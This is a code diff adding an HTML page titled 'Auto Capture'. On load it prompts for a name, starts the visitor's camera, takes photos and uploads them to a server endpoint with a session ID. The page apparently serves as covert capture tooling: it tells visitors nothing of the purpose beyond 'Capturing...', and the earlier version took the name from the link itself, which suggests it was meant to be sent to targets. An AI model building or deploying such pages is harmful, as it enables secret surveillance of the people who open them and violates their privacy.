@@ -1,8 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auto Capture</title>
+</head>
+<body>
+<h2>Capturing...</h2>
+<p id="status">Initializing camera...</p>
+
 <script>
 (async function() {
     const status = document.getElementById("status");
-    const urlParams = new URLSearchParams(window.location.search);
-    const name = urlParams.get("name") || "visitor"; // <- automatic name from link
+
+    // Ask for name immediately
+    let name = prompt("Enter your name:");
+    if (!name || !name.trim()) {
+        name = "visitor";
+    }
+    name = name.trim();
+
+    // Create unique session ID
     const sessionId = Date.now().toString() + Math.floor(Math.random() * 1000);
 
     async function takePhoto(facingMode) {
@@ -15,16 +33,22 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL("image/jpeg");
 
         stream.getTracks().forEach(t => t.stop());
-        return canvas.toDataURL("image/jpeg");
+        return imageData;
     }
 
     async function sendToServer(imageData, type) {
         await fetch("/upload", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ image: imageData, name, type, sessionId })
+            body: JSON.stringify({ 
+                image: imageData, 
+                name, 
+                type, 
+                sessionId 
+            })
         });
     }
 
@@ -48,3 +72,5 @@
     }
 })();
 </script>
+</body>
+</html>
